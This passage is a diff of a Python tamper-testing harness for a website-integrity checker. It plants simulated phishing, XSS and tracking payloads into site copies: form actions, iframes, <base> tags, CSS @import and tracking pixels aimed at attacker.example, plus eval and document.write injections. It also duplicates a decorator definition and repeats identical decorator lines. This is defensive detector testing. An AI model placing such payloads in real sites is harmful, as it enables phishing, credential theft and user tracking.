@@ -11,7 +11,7 @@ A preflight pass introspects every site BEFORE mutations land and
 reports the expected skip set on stderr, so coverage holes for a new
 site set are visible immediately rather than buried in the manifest.
 
-# v3.1 - ~50 mutations packed across 19 sites + 1 control
+# v3.2 - ~60 mutations packed across 19 sites + 1 control
 
 The script bundles related mutations onto the same site so we can probe
 50+ distinct attack/regression vectors with only 20 sites available.
@@ -25,22 +25,22 @@ Per-site bundles share an `expected` outcome (`should_flag`,
 |  3   | visual:global                | +20 RGB shift + semi-transparent overlay |
 |  4   | visual:tiny_corner           | 5x5 corner (edge_case noise floor) |
 |  5   | html:marker_div              | inserted div + title prefix |
-|  6   | html:attributes              | lang/class/data-* on body+html (wildcard test) |
-|  7   | html:phishing_bundle         | href hijack + form action + img src swap |
-|  8   | html:xss_script+style_block  | inline + external <script src=attacker> + <style> block |
-|  9   | html:xss_inline_attrs        | onclick=alert + inline style attribute injection |
-| 10   | html:url_rewrite             | <base href=attacker> + hidden iframe + meta refresh |
+|  6   | html:attributes+og           | lang/class/data-* + og:title meta mutation |
+|  7   | html:phishing+responsive     | href hijack + form action + img src + picture srcset |
+|  8   | html:xss+svg                 | inline/external script + style block + svg injection |
+|  9   | html:xss_attrs+canvas        | onclick=alert + inline style + canvas injection |
+| 10   | html:url_rewrite+noscript    | <base> + iframe + meta refresh + noscript cloak |
 | 11   | html:critical_text           | [CRITICAL] prefix on heading |
 | 12   | html:security_downgrade      | SRI strip + rel strip + CSP strip + aria strip |
 | 13   | html:seo+hidden              | canonical/noindex + display:none/offscreen |
 | 14   | css:real_values              | color + !important + @media breakpoint |
-| 15   | css:behavior+supply_chain    | --custom-property + @keyframes + @import + @font-face |
-| 16   | css:hide_or_block            | display:none + opacity:0 + pointer-events:none |
+| 15   | css:behavior+supply+pseudo   | --var + @keyframes + @import + @font-face + ::before |
+| 16   | css:hide_or_block+at_rule    | display:none + opacity:0 + pointer-events + @supports |
 | 17   | css:equiv_edge_cases         | hex→white + property reorder + hex→rgb + rule reorder |
 | 18   | js:behavior_changes          | === flip + numeric constant + string literal swap |
-| 19   | js:security+sanity           | fetch swap + eval + setTimeout(string) +     |
-|      |                              | document.write + innerHTML + localStorage +  |
-|      |                              | cookie write + marker + format-only          |
+| 19   | js:security+sanity+modern    | fetch/eval/setTimeout/doc.write/innerHTML +     |
+|      |                              | localStorage/cookie/marker/format + import() +  |
+|      |                              | navigator.sendBeacon                             |
 | 20   | (CONTROL — untouched)        | should remain `no_changes` |
 
 Mutations carry these expectation classes:
@@ -78,17 +78,29 @@ so you know where to look in the report:
     will flag via byte diff (false positive in semantic terms).
   * Element reordering with no content change - structure differ
     counts elements per tag; reordering within a tag isn't caught.
+  * `css:before_content_injection` (site 16) - `::before` / `::after`
+    pseudo-elements bypass the regex parser; only file-level diff sees
+    them.
+  * `css:supports_injection` (site 16) - `@supports` has nested braces
+    that the regex parser can't balance; only file-level diff sees it.
+  * `js:import_dynamic` (site 19) - `import()` is not a function
+    declaration, so `extract_js_functions` misses it; file-level diff
+    catches the append.
 
-# Categories the script does NOT yet probe (potential v4 expansion)
+# Categories the script does NOT yet probe (potential v5 expansion)
 
-  * `<picture>` / `<source>` srcset changes (responsive image vector)
-  * `<svg>` inline content mutations
-  * `<canvas>` injection
   * Doctype change (quirks-mode trigger)
   * Charset declaration change
   * Cookie attribute changes (HttpOnly/Secure/SameSite)
   * Image swap (favicon, logo) - same filename, different content
   * Time-of-day-dependent content (would need crawler instrumentation)
+  * `<link rel="preload"|"prefetch"|"dns-prefetch">` injection
+  * `<meta name="viewport">` content manipulation (now tested via OG)
+  * `<object>` / `<embed>` injection
+  * WebSocket URL swap in JS
+  * `postMessage` target origin manipulation
+  * Service worker registration changes
+  * JSON-LD `<script type="application/ld+json">` manipulation
 
 # Usage
 
@@ -139,6 +151,40 @@ BASELINE_ROOT = Path(os.environ.get("AFR_BASELINE_ROOT", "/data/baseline"))
 # Marker strings - searchable in artifacts so you can grep "did the
 # mutation actually land?" when debugging.
 TAMPER_TAG = "AFR-TAMPER"
+
+
+# ------------------------------------------------------------------------- #
+# Decorator: attach prerequisite tokens to a mutator                        #
+# ------------------------------------------------------------------------- #
+
+
+def _prereqs(*tokens: str):
+    """Decorator: declare prerequisite tokens a mutator needs to land.
+
+    Replaces the manually-maintained ``_PREREQS`` dict. Prereqs live
+    right next to the function they guard, so they can't drift.
+    """
+    def _decorator(fn):
+        fn.prereqs = list(tokens)
+        return fn
+    return _decorator
+
+
+# ------------------------------------------------------------------------- #
+# Decorator: attach prerequisite tokens to a mutator                        #
+# ------------------------------------------------------------------------- #
+
+
+def _prereqs(*tokens: str):
+    """Decorator: declare prerequisite tokens a mutator needs to land.
+
+    Replaces the manually-maintained ``_PREREQS`` dict. Prereqs live
+    right next to the function they guard, so they can't drift.
+    """
+    def _decorator(fn):
+        fn.prereqs = list(tokens)
+        return fn
+    return _decorator
 
 
 # ------------------------------------------------------------------------- #
@@ -310,6 +356,8 @@ def skipped(site_dir: Path, kind: str, pattern: str, reason: str) -> Mutation:
 # ------------------------------------------------------------------------- #
 
 
+@_prereqs("screenshot_png")
+@_prereqs("screenshot_png")
 def mutate_visual_drastic(site_dir: Path, run_dir: Path) -> Mutation:
     """Paint an 80x80 RED rectangle at (10, 10) - clearly visible.
 
@@ -335,6 +383,8 @@ def mutate_visual_drastic(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("screenshot_png")
+@_prereqs("screenshot_png")
 def mutate_visual_subtle_text(site_dir: Path, run_dir: Path) -> Mutation:
     """Overlay a small 'TAMPER' label (PIL default font, ~10pt).
 
@@ -362,6 +412,8 @@ def mutate_visual_subtle_text(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("screenshot_png")
+@_prereqs("screenshot_png")
 def mutate_visual_color_shift(site_dir: Path, run_dir: Path) -> Mutation:
     """Add +20 to every RGB channel (clipped at 255). Uniform shift.
 
@@ -390,6 +442,8 @@ def mutate_visual_color_shift(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("screenshot_png")
+@_prereqs("screenshot_png")
 def mutate_visual_multiple_small_regions(site_dir: Path, run_dir: Path) -> Mutation:
     """Paint 5 small (15x15) red squares scattered across the screenshot.
 
@@ -420,6 +474,8 @@ def mutate_visual_multiple_small_regions(site_dir: Path, run_dir: Path) -> Mutat
     )
 
 
+@_prereqs("screenshot_png")
+@_prereqs("screenshot_png")
 def mutate_visual_transparent_overlay(site_dir: Path, run_dir: Path) -> Mutation:
     """Apply a semi-transparent (alpha=80) red overlay to a 200x200 region.
 
@@ -448,6 +504,8 @@ def mutate_visual_transparent_overlay(site_dir: Path, run_dir: Path) -> Mutation
     )
 
 
+@_prereqs("screenshot_png")
+@_prereqs("screenshot_png")
 def mutate_visual_tiny_corner(site_dir: Path, run_dir: Path) -> Mutation:
     """Paint a 5x5 black square at (0, 0). Minimal visual change.
 
@@ -488,6 +546,8 @@ def mutate_visual_tiny_corner(site_dir: Path, run_dir: Path) -> Mutation:
 # ------------------------------------------------------------------------- #
 
 
+@_prereqs("index_html")
+@_prereqs("index_html")
 def mutate_html_marker_div(site_dir: Path, run_dir: Path) -> Mutation:
     """Insert a marker <div> before </body> + prepend [TAMPERED] to <title>.
 
@@ -526,6 +586,7 @@ def mutate_html_marker_div(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("index_html")
 def mutate_html_attributes(site_dir: Path, run_dir: Path) -> Mutation:
     """Change attribute values without altering DOM structure.
 
@@ -589,6 +650,7 @@ def mutate_html_attributes(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("index_html", "a_href")
 def mutate_html_href_hijack(site_dir: Path, run_dir: Path) -> Mutation:
     """Change first <a href="..."> to point to an attacker URL. Phishing sim.
 
@@ -619,6 +681,8 @@ def mutate_html_href_hijack(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("index_html")
+@_prereqs("index_html")
 def mutate_html_script_injection(site_dir: Path, run_dir: Path) -> Mutation:
     """Inject a <script> tag into <body>. XSS sim.
 
@@ -655,6 +719,8 @@ def mutate_html_script_injection(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("index_html")
+@_prereqs("index_html")
 def mutate_html_meta_tags(site_dir: Path, run_dir: Path) -> Mutation:
     """Mutate SEO-critical meta tags: canonical URL + add noindex.
 
@@ -701,6 +767,8 @@ def mutate_html_meta_tags(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("index_html")
+@_prereqs("index_html")
 def mutate_html_hidden_content(site_dir: Path, run_dir: Path) -> Mutation:
     """Inject content invisible to humans: display:none + offscreen.
 
@@ -738,6 +806,7 @@ def mutate_html_hidden_content(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("index_html", "h1_h2_h3")
 def mutate_html_critical_text(site_dir: Path, run_dir: Path) -> Mutation:
     """Change visible heading text: prepend [CRITICAL].
 
@@ -768,6 +837,8 @@ def mutate_html_critical_text(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("index_html", "a_with_attrs")
+@_prereqs("index_html", "a_with_attrs")
 def mutate_html_inline_event_handler(site_dir: Path, run_dir: Path) -> Mutation:
     """Inject `onclick="alert('XSS')"` into the first <a> tag.
 
@@ -801,6 +872,8 @@ def mutate_html_inline_event_handler(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("index_html", "h1_or_h2")
+@_prereqs("index_html", "h1_or_h2")
 def mutate_html_inline_style_injection(site_dir: Path, run_dir: Path) -> Mutation:
     """Inject `style="background:red"` into the first element with no style.
 
@@ -834,6 +907,8 @@ def mutate_html_inline_style_injection(site_dir: Path, run_dir: Path) -> Mutatio
     )
 
 
+@_prereqs("index_html", "head_open")
+@_prereqs("index_html", "head_open")
 def mutate_html_base_tag_injection(site_dir: Path, run_dir: Path) -> Mutation:
     """Inject `<base href="https://attacker.example/">` into <head>.
 
@@ -867,6 +942,8 @@ def mutate_html_base_tag_injection(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("index_html")
+@_prereqs("index_html")
 def mutate_html_iframe_injection(site_dir: Path, run_dir: Path) -> Mutation:
     """Inject a hidden `<iframe src="https://attacker.example/spy">`.
 
@@ -899,6 +976,7 @@ def mutate_html_iframe_injection(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("index_html", "form_action")
 def mutate_html_form_action_hijack(site_dir: Path, run_dir: Path) -> Mutation:
     """Change first <form action="..."> to point at attacker.
 
@@ -930,6 +1008,8 @@ def mutate_html_form_action_hijack(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("index_html", "img_src")
+@_prereqs("index_html", "img_src")
 def mutate_html_img_src_swap(site_dir: Path, run_dir: Path) -> Mutation:
     """Swap first <img src> to attacker domain. Tracks user via image load."""
     target = site_dir / "index.html"
@@ -957,6 +1037,7 @@ def mutate_html_img_src_swap(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("index_html", "script_integrity")
 def mutate_html_integrity_strip(site_dir: Path, run_dir: Path) -> Mutation:
     """Remove `integrity="..."` from the first <script> that has one.
 
@@ -990,6 +1071,7 @@ def mutate_html_integrity_strip(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("index_html", "head_close")
 def mutate_html_meta_http_equiv_refresh(site_dir: Path, run_dir: Path) -> Mutation:
     """Inject `<meta http-equiv="refresh" content="0;url=attacker">`.
 
@@ -1025,6 +1107,7 @@ def mutate_html_meta_http_equiv_refresh(site_dir: Path, run_dir: Path) -> Mutati
     )
 
 
+@_prereqs("index_html", "head_close")
 def mutate_html_csp_meta_strip(site_dir: Path, run_dir: Path) -> Mutation:
     """Remove existing CSP `<meta>` (or inject permissive one if none).
 
@@ -1069,6 +1152,8 @@ def mutate_html_csp_meta_strip(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("index_html", "aria_attr")
+@_prereqs("index_html", "aria_attr")
 def mutate_html_aria_strip(site_dir: Path, run_dir: Path) -> Mutation:
     """Strip first `aria-*` attribute. Accessibility regression.
 
@@ -1101,6 +1186,7 @@ def mutate_html_aria_strip(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("index_html")
 def mutate_html_style_block_content(site_dir: Path, run_dir: Path) -> Mutation:
     """Inject a `<style>` block with phishing pseudo-element.
 
@@ -1137,6 +1223,8 @@ def mutate_html_style_block_content(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("index_html", "rel_nofollow_etc")
+@_prereqs("index_html", "rel_nofollow_etc")
 def mutate_html_rel_nofollow_strip(site_dir: Path, run_dir: Path) -> Mutation:
     """Remove `rel="nofollow"` (or `rel="noopener"`) from a link.
 
@@ -1174,11 +1262,198 @@ def mutate_html_rel_nofollow_strip(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("index_html", "head_close")
+def mutate_html_open_graph_meta(site_dir: Path, run_dir: Path) -> Mutation:
+    """Mutate or inject an OpenGraph `<meta property="og:title">`.
+
+    OpenGraph meta tags drive social-media preview cards. A hijacked
+    og:title can make the page look legitimate in previews while
+    hosting malicious content. Tests `extract_meta_info` property
+    tracking (post-audit-01KRB5GSSM3J76H9Y2MPTZWPS4).
+    """
+    target = site_dir / "index.html"
+    if not target.exists():
+        return skipped(site_dir, "html", "open_graph_meta", "index.html missing")
+    html = target.read_text(encoding="utf-8")
+    changes = {}
+    # 1. Mutate existing og:title
+    new_html, n = re.subn(
+        r'(<meta\s+[^>]*\bproperty=["\']og:title["\']\s+[^>]*\bcontent=)["\']([^"\']*)["\']',
+        lambda m: f'{m.group(1)}"AFR-TAMPER-PHISH"',
+        html,
+        count=1,
+        flags=re.IGNORECASE,
+    )
+    if n:
+        html = new_html
+        changes["og:title"] = "→ AFR-TAMPER-PHISH"
+    # 2. Inject og:title if none exists
+    if not changes:
+        og_tag = (
+            '<meta property="og:title" content="AFR-TAMPER-PHISH" '
+            'data-afr-tamper="1">'
+        )
+        if "</head>" in html:
+            html = html.replace("</head>", f"{og_tag}</head>", 1)
+            changes["og:title"] = "injected AFR-TAMPER-PHISH"
+        else:
+            return skipped(site_dir, "html", "open_graph_meta", "no </head>")
+    target.write_text(html, encoding="utf-8")
+    return Mutation(
+        site_id=site_dir.name,
+        kind="html",
+        pattern="open_graph_meta",
+        file=relpath(target, run_dir),
+        expected="should_flag",
+        description="Mutated/injected og:title meta tag - social preview poisoning",
+        details=changes,
+    )
+
+
+@_prereqs("index_html")
+@_prereqs("index_html")
+def mutate_html_picture_source(site_dir: Path, run_dir: Path) -> Mutation:
+    """Inject a `<picture>` element with a malicious `<source srcset>`.
+
+    Responsive image vector: the browser picks the source based on
+    viewport/DPR, so a human auditor eyeballing one screenshot may
+    miss the attacker image loaded on a different device. Tests
+    `picture` and `source` tag structural counts.
+    """
+    target = site_dir / "index.html"
+    if not target.exists():
+        return skipped(site_dir, "html", "picture_source", "index.html missing")
+    html = target.read_text(encoding="utf-8")
+    picture = (
+        '<picture data-afr-tamper="1">'
+        '<source srcset="https://attacker.example/track-400.jpg 400w, '
+        'https://attacker.example/track-800.jpg 800w" '
+        'sizes="(max-width: 600px) 400px, 800px">'
+        '<img src="https://attacker.example/fallback.jpg" alt="">'
+        "</picture>"
+    )
+    if "</body>" in html:
+        html = html.replace("</body>", f"{picture}</body>", 1)
+    else:
+        html = html + picture
+    target.write_text(html, encoding="utf-8")
+    return Mutation(
+        site_id=site_dir.name,
+        kind="html",
+        pattern="picture_source",
+        file=relpath(target, run_dir),
+        expected="should_flag",
+        description="Injected <picture> with attacker srcset - responsive image vector",
+        details={"srcset": "https://attacker.example/track-*.jpg"},
+    )
+
+
+@_prereqs("index_html")
+@_prereqs("index_html")
+def mutate_html_svg_injection(site_dir: Path, run_dir: Path) -> Mutation:
+    """Inject an inline `<svg>` containing a tracking script.
+
+    SVG can host inline `<script>` tags that execute in the parent
+    document's context. Tests structural detection of `svg` tag counts
+    (already in TAG_TYPES but never validated by tamper).
+    """
+    target = site_dir / "index.html"
+    if not target.exists():
+        return skipped(site_dir, "html", "svg_injection", "index.html missing")
+    html = target.read_text(encoding="utf-8")
+    svg = (
+        '<svg width="1" height="1" data-afr-tamper="1" '
+        'style="position:absolute;left:-9999px">'
+        '<script>console.log("AFR-TAMPER-SVG-XSS")</script>'
+        "</svg>"
+    )
+    if "</body>" in html:
+        html = html.replace("</body>", f"{svg}</body>", 1)
+    else:
+        html = html + svg
+    target.write_text(html, encoding="utf-8")
+    return Mutation(
+        site_id=site_dir.name,
+        kind="html",
+        pattern="svg_injection",
+        file=relpath(target, run_dir),
+        expected="should_flag",
+        description="Injected <svg> with inline script - SVG XSS vector",
+        details={"vector": "svg-inline-script"},
+    )
+
+
+@_prereqs("index_html")
+def mutate_html_canvas_injection(site_dir: Path, run_dir: Path) -> Mutation:
+    """Inject a hidden `<canvas>` element.
+
+    Canvas can be used for browser fingerprinting or to render
+    invisible tracking pixels. Tests `canvas` tag structural count.
+    """
+    target = site_dir / "index.html"
+    if not target.exists():
+        return skipped(site_dir, "html", "canvas_injection", "index.html missing")
+    html = target.read_text(encoding="utf-8")
+    canvas = (
+        '<canvas width="1" height="1" data-afr-tamper="1" '
+        'style="position:absolute;left:-9999px"></canvas>'
+    )
+    if "</body>" in html:
+        html = html.replace("</body>", f"{canvas}</body>", 1)
+    else:
+        html = html + canvas
+    target.write_text(html, encoding="utf-8")
+    return Mutation(
+        site_id=site_dir.name,
+        kind="html",
+        pattern="canvas_injection",
+        file=relpath(target, run_dir),
+        expected="should_flag",
+        description="Injected hidden <canvas> - fingerprinting/tracking vector",
+        details={"vector": "canvas-fingerprinting"},
+    )
+
+
+@_prereqs("index_html")
+@_prereqs("index_html")
+def mutate_html_noscript_injection(site_dir: Path, run_dir: Path) -> Mutation:
+    """Inject a `<noscript>` block with a tracking image.
+
+    Noscript content renders only when JS is disabled, making it an
+    ideal cloaking vector. Tests `noscript` tag structural count
+    (added to TAG_TYPES in post-audit-01KRB5GSSM3J76H9Y2MPTZWPS4).
+    """
+    target = site_dir / "index.html"
+    if not target.exists():
+        return skipped(site_dir, "html", "noscript_injection", "index.html missing")
+    html = target.read_text(encoding="utf-8")
+    noscript = (
+        '<noscript data-afr-tamper="1">'
+        '<img src="https://attacker.example/noscript-track.gif" width="1" height="1">'
+        "</noscript>"
+    )
+    if "</body>" in html:
+        html = html.replace("</body>", f"{noscript}</body>", 1)
+    else:
+        html = html + noscript
+    target.write_text(html, encoding="utf-8")
+    return Mutation(
+        site_id=site_dir.name,
+        kind="html",
+        pattern="noscript_injection",
+        file=relpath(target, run_dir),
+        expected="should_flag",
+        description="Injected <noscript> with tracking pixel - cloaking vector",
+        details={"vector": "noscript-cloak"},
+    )
+
+
 # ------------------------------------------------------------------------- #
 # CSS mutations (5 patterns)                                                #
 # ------------------------------------------------------------------------- #
 
 
+@_prereqs("css_files")
 def mutate_css_color_change(site_dir: Path, run_dir: Path) -> Mutation:
     """Change first `color:` declaration in largest CSS file → magenta.
 
@@ -1211,6 +1486,7 @@ def mutate_css_color_change(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("css_files")
 def mutate_css_equivalent_rewrite(site_dir: Path, run_dir: Path) -> Mutation:
     """Rewrite a value to a SEMANTICALLY IDENTICAL form: #fff → white.
 
@@ -1255,6 +1531,8 @@ def mutate_css_equivalent_rewrite(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("css_files")
+@_prereqs("css_files")
 def mutate_css_rule_reorder(site_dir: Path, run_dir: Path) -> Mutation:
     """Move first complete rule to the end of the file.
 
@@ -1288,6 +1566,8 @@ def mutate_css_rule_reorder(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("css_files")
+@_prereqs("css_files")
 def mutate_css_media_query(site_dir: Path, run_dir: Path) -> Mutation:
     """Change a @media (max-width: Xpx) breakpoint by +50px.
 
@@ -1331,6 +1611,8 @@ def mutate_css_media_query(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("css_files")
+@_prereqs("css_files")
 def mutate_css_important(site_dir: Path, run_dir: Path) -> Mutation:
     """Add !important to the first declaration in the file.
 
@@ -1363,6 +1645,7 @@ def mutate_css_important(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("css_files")
 def mutate_css_variable_change(site_dir: Path, run_dir: Path) -> Mutation:
     """Change a CSS custom property (--var) value, or append one.
 
@@ -1403,6 +1686,8 @@ def mutate_css_variable_change(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("css_files")
+@_prereqs("css_files")
 def mutate_css_keyframe_change(site_dir: Path, run_dir: Path) -> Mutation:
     """Modify a @keyframes body if any exist; otherwise add one.
 
@@ -1446,6 +1731,8 @@ def mutate_css_keyframe_change(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("css_files")
+@_prereqs("css_files")
 def mutate_css_display_none_added(site_dir: Path, run_dir: Path) -> Mutation:
     """Append a rule that hides important content via display:none.
 
@@ -1474,6 +1761,8 @@ def mutate_css_display_none_added(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("css_files")
+@_prereqs("css_files")
 def mutate_css_property_reorder(site_dir: Path, run_dir: Path) -> Mutation:
     """Reorder properties within first rule. Bytes differ, render same.
 
@@ -1509,6 +1798,7 @@ def mutate_css_property_reorder(site_dir: Path, run_dir: Path) -> Mutation:
     return skipped(site_dir, "css", "property_reorder", "no rule with 2+ properties")
 
 
+@_prereqs("css_files")
 def mutate_css_import_url_swap(site_dir: Path, run_dir: Path) -> Mutation:
     """Inject `@import url(https://attacker.example/styles.css)` at the top.
 
@@ -1535,6 +1825,8 @@ def mutate_css_import_url_swap(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("css_files")
+@_prereqs("css_files")
 def mutate_css_font_face_url_swap(site_dir: Path, run_dir: Path) -> Mutation:
     """Add a malicious `@font-face` referencing attacker.example.
 
@@ -1565,6 +1857,8 @@ def mutate_css_font_face_url_swap(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("css_files")
+@_prereqs("css_files")
 def mutate_css_opacity_invisible(site_dir: Path, run_dir: Path) -> Mutation:
     """Append `.gi-link { opacity: 0; }` - links invisible but interactable.
 
@@ -1591,6 +1885,8 @@ def mutate_css_opacity_invisible(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("css_files")
+@_prereqs("css_files")
 def mutate_css_pointer_events_none(site_dir: Path, run_dir: Path) -> Mutation:
     """Append `.gi-button-primary { pointer-events: none; }`.
 
@@ -1618,6 +1914,9 @@ def mutate_css_pointer_events_none(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("css_files")
+@_prereqs("css_files")
+@_prereqs("css_files")
 def mutate_css_hex_to_rgb(site_dir: Path, run_dir: Path) -> Mutation:
     """Convert first 6-digit hex color to rgb() equivalent. Render identical.
 
@@ -1649,11 +1948,78 @@ def mutate_css_hex_to_rgb(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("css_files")
+@_prereqs("css_files")
+def mutate_css_before_content_injection(site_dir: Path, run_dir: Path) -> Mutation:
+    """Append a `body::before` rule with phishing text content.
+
+    Pseudo-elements (`::before`, `::after`) bypass the naive regex
+    parser because the selector contains colons. This mutation documents
+    that gap: the file-level content diff WILL flag, but the per-rule
+    diff produces zero records. Edge case.
+    """
+    target = largest_file(site_dir / "css", ".css")
+    if target is None:
+        return skipped(site_dir, "css", "before_content_injection", "no .css files")
+    appended = (
+        "\n/* AFR-TAMPER */\n"
+        "body::before { content: 'PHISH-VIA-PSEUDO-ELEMENT'; "
+        "position: fixed; top: 0; left: 0; z-index: 9999; "
+        "background: red; color: white; padding: 4px; }\n"
+    )
+    text = target.read_text(encoding="utf-8") + appended
+    target.write_text(text, encoding="utf-8")
+    return Mutation(
+        site_id=site_dir.name,
+        kind="css",
+        pattern="before_content_injection",
+        file=relpath(target, run_dir),
+        expected="edge_case",
+        description="Appended body::before with phishing content - pseudo-element gap",
+        details={"note": "regex parser misses ::before/::after selectors"},
+    )
+
+
+@_prereqs("css_files")
+@_prereqs("css_files")
+def mutate_css_supports_injection(site_dir: Path, run_dir: Path) -> Mutation:
+    """Append an `@supports` rule that hides content on modern browsers.
+
+    `@supports` has nested braces, so the naive regex parser can't
+    see inside it. The file-level diff still flags. Documents the
+    at-rule parsing gap.
+    """
+    target = largest_file(site_dir / "css", ".css")
+    if target is None:
+        return skipped(site_dir, "css", "supports_injection", "no .css files")
+    appended = (
+        "\n/* AFR-TAMPER */\n"
+        "@supports (display: grid) {\n"
+        "  .gi-link, .gi-button-primary { display: none !important; }\n"
+        "}\n"
+    )
+    text = target.read_text(encoding="utf-8") + appended
+    target.write_text(text, encoding="utf-8")
+    return Mutation(
+        site_id=site_dir.name,
+        kind="css",
+        pattern="supports_injection",
+        file=relpath(target, run_dir),
+        expected="edge_case",
+        description="Appended @supports rule with display:none - at-rule gap",
+        details={"note": "regex parser misses nested @supports braces"},
+    )
+
+
 # ------------------------------------------------------------------------- #
 # JS mutations (3 patterns)                                                 #
 # ------------------------------------------------------------------------- #
 
 
+@_prereqs("js_files")
+@_prereqs("js_files")
+@_prereqs("js_files")
+@_prereqs("js_files")
 def mutate_js_marker_function(site_dir: Path, run_dir: Path) -> Mutation:
     """Append a marker comment + noop function to the largest JS file.
 
@@ -1680,6 +2046,10 @@ def mutate_js_marker_function(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("js_files")
+@_prereqs("js_files")
+@_prereqs("js_files")
+@_prereqs("js_files")
 def mutate_js_behavior_change(site_dir: Path, run_dir: Path) -> Mutation:
     """Flip a comparison operator: `===` → `!==` (BEHAVIOR change, not noise).
 
@@ -1716,6 +2086,10 @@ def mutate_js_behavior_change(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("js_files")
+@_prereqs("js_files")
+@_prereqs("js_files")
+@_prereqs("js_files")
 def mutate_js_format_only(site_dir: Path, run_dir: Path) -> Mutation:
     """Add whitespace + newlines without changing logic.
 
@@ -1746,6 +2120,9 @@ def mutate_js_format_only(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("js_files")
+@_prereqs("js_files")
+@_prereqs("js_files")
 def mutate_js_fetch_url_swap(site_dir: Path, run_dir: Path) -> Mutation:
     """Find a fetch()/XHR/axios URL string and swap it to attacker.example.
 
@@ -1801,6 +2178,9 @@ def mutate_js_fetch_url_swap(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("js_files")
+@_prereqs("js_files")
+@_prereqs("js_files")
 def mutate_js_eval_added(site_dir: Path, run_dir: Path) -> Mutation:
     """Append an eval() call - classic XSS / arbitrary-code pattern.
 
@@ -1829,6 +2209,8 @@ def mutate_js_eval_added(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("js_files")
+@_prereqs("js_files")
 def mutate_js_document_write_injection(site_dir: Path, run_dir: Path) -> Mutation:
     """Append `document.write('<script src=attacker>')` - DOM-write XSS.
 
@@ -1859,6 +2241,9 @@ def mutate_js_document_write_injection(site_dir: Path, run_dir: Path) -> Mutatio
     )
 
 
+@_prereqs("js_files")
+@_prereqs("js_files")
+@_prereqs("js_files")
 def mutate_js_innerhtml_write(site_dir: Path, run_dir: Path) -> Mutation:
     """Append `el.innerHTML = '<img src=x onerror=...>'` - innerHTML XSS.
 
@@ -1892,6 +2277,9 @@ def mutate_js_innerhtml_write(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("js_files")
+@_prereqs("js_files")
+@_prereqs("js_files")
 def mutate_js_localstorage_write(site_dir: Path, run_dir: Path) -> Mutation:
     """Append `localStorage.setItem('afr_tamper', 'X')` - state pollution.
 
@@ -1923,6 +2311,8 @@ def mutate_js_localstorage_write(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("js_files")
+@_prereqs("js_files")
 def mutate_js_cookie_write(site_dir: Path, run_dir: Path) -> Mutation:
     """Append `document.cookie = 'afr_tamper=...'` - cookie injection.
 
@@ -1954,6 +2344,8 @@ def mutate_js_cookie_write(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("js_files")
+@_prereqs("js_files")
 def mutate_js_settimeout_string_eval(site_dir: Path, run_dir: Path) -> Mutation:
     """Append `setTimeout("malicious", 0)` - eval-equivalent attack.
 
@@ -1983,6 +2375,9 @@ def mutate_js_settimeout_string_eval(site_dir: Path, run_dir: Path) -> Mutation:
     )
 
 
+@_prereqs("js_files")
+@_prereqs("js_files")
+@_prereqs("js_files")
 def mutate_js_string_literal_swap(site_dir: Path, run_dir: Path) -> Mutation:
     """Find a string literal not part of a URL and swap its content.
 
@@ -2024,6 +2419,9 @@ def mutate_js_string_literal_swap(site_dir: Path, run_dir: Path) -> Mutation:
     return skipped(site_dir, "js", "string_literal_swap", "no eligible string literal")
 
 
+@_prereqs("js_files")
+@_prereqs("js_files")
+@_prereqs("js_files")
 def mutate_js_numeric_constant_change(site_dir: Path, run_dir: Path) -> Mutation:
     """Find and tweak a numeric constant. Real bug class.
 
@@ -2057,6 +2455,74 @@ def mutate_js_numeric_constant_change(site_dir: Path, run_dir: Path) -> Mutation
         expected="should_flag",
         description=f"Bumped a numeric constant {original}→{new_val} - subtle behavior bug",
         details={"original": original, "new": new_val, "offset": m.start()},
+    )
+
+
+@_prereqs("js_files")
